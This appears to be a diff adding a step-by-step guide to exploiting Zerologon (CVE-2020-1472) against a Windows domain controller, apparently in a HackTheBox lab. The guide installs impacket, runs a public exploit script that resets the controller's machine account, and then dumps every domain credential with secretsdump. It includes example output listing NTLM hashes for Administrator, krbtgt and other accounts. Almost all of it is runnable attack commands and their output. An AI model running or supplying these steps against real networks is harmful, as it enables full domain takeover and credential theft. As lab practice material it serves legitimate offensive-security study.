@@ -1,0 +1,43 @@
+1. Make sure you have the latest impacket installed, if import error occur install via venv.
+	GUIDE:
+		git clone https://github.com/SecureAuthCorp/impacket.git
+		sudo apt install virtualenv
+		virtualenv impacket-venv
+		source impacket-venv/bin/activate
+		cd ~/impacket
+		pip3 install -r requirements.txt
+		pip3 install .
+		cd ~/impacket-venv/bin
+
+2. git clone https://github.com/dirkjanm/CVE-2020-1472.git
+
+3. cd CVE-2020-1472/
+
+4. python3 cve-2020-1472-exploit.py <dc-name> <dc-ip>
+	Example:
+		python3 cve-2020-1472-exploit.py MULTIMASTER 10.10.10.179
+
+5. secretsdump.py -just-dc -no-pass <dc-name>\$@<dc-ip>
+	Example:
+		secretsdump.py -just-dc -no-pass MULTIMASTER\$@10.10.10.179
+
+6. Example OUTPUT:
+====================================================================================================
+Impacket v0.9.22.dev1+20201112.141202.d1ced941 - Copyright 2020 SecureAuth Corporation
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:69cbf4a9b7415c9e1caf93d51d971be0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:06e3ae564999dbad74e576cdf0f717d3:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+MEGACORP.LOCAL\svc-nas:1103:aad3b435b51404eeaad3b435b51404ee:fe90dcf97ce6511a65151881708d6027:::
+MEGACORP.LOCAL\pmartin:des-cbc-md5:cdcda7c44970f445S
+...
+...
+...
+MULTIMASTER$:aes256-cts-hmac-sha1-96:b76bd99f213d43704c64506e92700c881cdd4ab484a98e3c0a64fe190c7ce725
+MULTIMASTER$:aes128-cts-hmac-sha1-96:2e3f83637a857711f71236649844b048
+MULTIMASTER$:des-cbc-md5:fb9d1cd3343276f4
+[*] Cleaning up... 
+====================================================================================================
